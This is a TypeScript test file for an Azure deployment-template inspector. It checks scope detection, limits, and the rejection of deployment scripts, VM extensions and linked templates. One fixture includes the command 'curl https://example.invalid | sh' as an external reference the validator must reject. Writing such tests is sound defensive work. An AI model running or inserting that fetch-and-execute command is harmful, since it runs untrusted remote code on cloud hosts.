import { describe, expect, it } from 'vitest';
import {
  DEFAULT_INSPECTION_LIMITS,
  inspectTemplate,
  scopeFromSchema,
} from '../../src/bicep/inspect.js';
import { RG_TEMPLATE, SUBSCRIPTION_TEMPLATE } from '../helpers/bicep.js';

const rejects = (template: unknown, pattern: RegExp, limits = DEFAULT_INSPECTION_LIMITS): void => {
  expect(() => inspectTemplate(template, limits)).toThrowError(
    expect.objectContaining({ code: 'bad_request' }) as unknown,
  );
  expect(() => inspectTemplate(template, limits)).toThrowError(pattern);
};

const withResources = (resources: unknown): Record<string, unknown> => ({
  ...RG_TEMPLATE,
  resources,
});

const nested = (inner: unknown): Record<string, unknown> =>
  withResources([
    {
      type: 'Microsoft.Resources/deployments',
      apiVersion: '2024-03-01',
      name: 'inner',
      properties: { mode: 'Incremental', template: { resources: inner } },
    },
  ]);

describe('template scope detection', () => {
  it.each([
    ['deploymentTemplate.json#', 'resourceGroup'],
    ['subscriptionDeploymentTemplate.json#', 'subscription'],
    ['managementGroupDeploymentTemplate.json#', 'managementGroup'],
    ['tenantDeploymentTemplate.json#', 'tenant'],
  ])('maps %s to %s', (schema, expected) => {
    expect(
      scopeFromSchema(`https://schema.management.azure.com/schemas/2019-04-01/${schema}`),
    ).toBe(expected);
  });

  it('rejects an unknown or missing schema', () => {
    expect(() => scopeFromSchema(undefined)).toThrowError(/no \$schema/);
    expect(() => scopeFromSchema('https://example.invalid/other.json')).toThrowError(
      /unsupported deployment scope/,
    );
  });
});

describe('inspectTemplate', () => {
  it('summarises a well-formed resource group template', () => {
    const inspection = inspectTemplate(RG_TEMPLATE);
    expect(inspection.templateScope).toBe('resourceGroup');
    expect(inspection.resourceTypes).toEqual(['microsoft.storage/storageaccounts']);
    expect(inspection.resourceCount).toBe(1);
    expect(inspection.secureParameterNames).toEqual(['adminPassword']);
    expect(inspection.parameterNames).toEqual(['adminPassword', 'name']);
    expect(inspection.outputNames).toEqual(['accountId', 'primaryKey']);
    expect(inspection.templateHash).toMatch(/^[0-9a-f]{64}$/);
  });

  it('hashes independently of key order', () => {
    const reordered = Object.fromEntries(Object.entries(RG_TEMPLATE).reverse());
    expect(inspectTemplate(reordered).templateHash).toBe(inspectTemplate(RG_TEMPLATE).templateHash);
  });

  it('handles the symbolic-name object form of resources', () => {
    const inspection = inspectTemplate(
      withResources({ storage: (RG_TEMPLATE.resources as unknown[])[0] }),
    );
    expect(inspection.resourceCount).toBe(1);
  });

  it('recurses into inline nested deployments', () => {
    const inspection = inspectTemplate(
      nested([
        { type: 'Microsoft.Network/virtualNetworks', apiVersion: '2023-05-01', name: 'vnet' },
      ]),
    );
    expect(inspection.nestedDeploymentCount).toBe(1);
    expect(inspection.resourceTypes).toContain('microsoft.network/virtualnetworks');
  });

  it('rejects deployment scripts at the top level', () => {
    rejects(
      withResources([
        { type: 'Microsoft.Resources/deploymentScripts', apiVersion: '2023-08-01', name: 's' },
      ]),
      /executes arbitrary code/,
    );
  });

  it('rejects deployment scripts hidden inside a nested deployment', () => {
    rejects(
      nested([
        { type: 'microsoft.resources/DEPLOYMENTSCRIPTS', apiVersion: '2023-08-01', name: 's' },
      ]),
      /executes arbitrary code/,
    );
  });

  it('rejects operator-denied resource types such as VM extensions', () => {
    rejects(
      withResources([
        {
          type: 'Microsoft.Compute/virtualMachines/extensions',
          apiVersion: '2024-03-01',
          name: 'vm/custom',
        },
      ]),
      /not permitted by this server/,
    );
  });

  it('rejects linked templates', () => {
    rejects(
      withResources([
        {
          type: 'Microsoft.Resources/deployments',
          apiVersion: '2024-03-01',
          name: 'linked',
          properties: {
            mode: 'Incremental',
            templateLink: { uri: 'https://example.invalid/t.json' },
          },
        },
      ]),
      /references external content through "templateLink"/,
    );
  });

  it.each([
    ['parametersLink', { parametersLink: { uri: 'https://example.invalid/p.json' } }],
    ['contentLink', { contentLink: { uri: 'https://example.invalid/c.json' } }],
    ['fileUris', { fileUris: ['https://example.invalid/x.sh'] }],
    ['commandToExecute', { commandToExecute: 'curl https://example.invalid | sh' }],
    ['primaryScriptUri', { primaryScriptUri: 'https://example.invalid/s.ps1' }],
  ])('rejects an external reference through %s anywhere in the template', (_name, properties) => {
    rejects(
      withResources([
        {
          type: 'Microsoft.Storage/storageAccounts',
          apiVersion: '2023-05-01',
          name: 'sa',
          properties,
        },
      ]),
      /references external content/,
    );
  });

  it('rejects a nested deployment without an inline template', () => {
    rejects(
      withResources([
        {
          type: 'Microsoft.Resources/deployments',
          apiVersion: '2024-03-01',
          name: 'linked',
          properties: { mode: 'Incremental' },
        },
      ]),
      /does not carry an inline template/,
    );
  });

  it('rejects Complete mode in a nested deployment', () => {
    rejects(
      withResources([
        {
          type: 'Microsoft.Resources/deployments',
          apiVersion: '2024-03-01',
          name: 'inner',
          properties: { mode: 'Complete', template: { resources: [] } },
        },
      ]),
      /Complete mode/,
    );
  });

  it('rejects structures that cannot be inspected', () => {
    rejects(withResources('not-an-array'), /neither an array nor an object/);
    rejects(withResources(['string-entry']), /is not an object/);
    rejects(withResources([{ apiVersion: '2024-03-01', name: 'x' }]), /has no type/);
    rejects(undefined, /not a JSON object/);
  });

  it('enforces the resource count limit', () => {
    const many = Array.from({ length: 5 }, (_, index) => ({
      type: 'Microsoft.Storage/storageAccounts',
      apiVersion: '2023-05-01',
      name: `sa${index}`,
    }));
    rejects(withResources(many), /more than 3 resources/, {
      ...DEFAULT_INSPECTION_LIMITS,
      maxResources: 3,
    });
  });

  it('enforces the nested deployment limit', () => {
    rejects(nested([]), /more than 0 nested deployments/, {
      ...DEFAULT_INSPECTION_LIMITS,
      maxNestedDeployments: 0,
    });
  });

  it('enforces the template size limit', () => {
    rejects(RG_TEMPLATE, /exceeds 10 bytes/, {
      ...DEFAULT_INSPECTION_LIMITS,
      maxTemplateBytes: 10,
    });
  });

  it('collects cross-scope targets rather than silently allowing them', () => {
    const inspection = inspectTemplate(
      withResources([
        {
          type: 'Microsoft.Resources/deployments',
          apiVersion: '2024-03-01',
          name: 'other',
          subscriptionId: '99999999-9999-9999-9999-999999999999',
          resourceGroup: 'rg-elsewhere',
          properties: { mode: 'Incremental', template: { resources: [] } },
        },
      ]),
    );
    expect(inspection.crossScopeTargets).toEqual([
      {
        subscriptionId: '99999999-9999-9999-9999-999999999999',
        resourceGroup: 'rg-elsewhere',
        managementGroupId: undefined,
      },
    ]);
  });

  it('warns about privileged resource types without blocking them', () => {
    const inspection = inspectTemplate(
      withResources([
        {
          type: 'Microsoft.Authorization/roleAssignments',
          apiVersion: '2022-04-01',
          name: 'assignment',
        },
      ]),
    );
    expect(inspection.warnings.map((warning) => warning.code)).toContain(
      'privileged_resource_type',
    );
  });

  it('detects the subscription scope of a subscription template', () => {
    expect(inspectTemplate(SUBSCRIPTION_TEMPLATE).templateScope).toBe('subscription');
  });
});
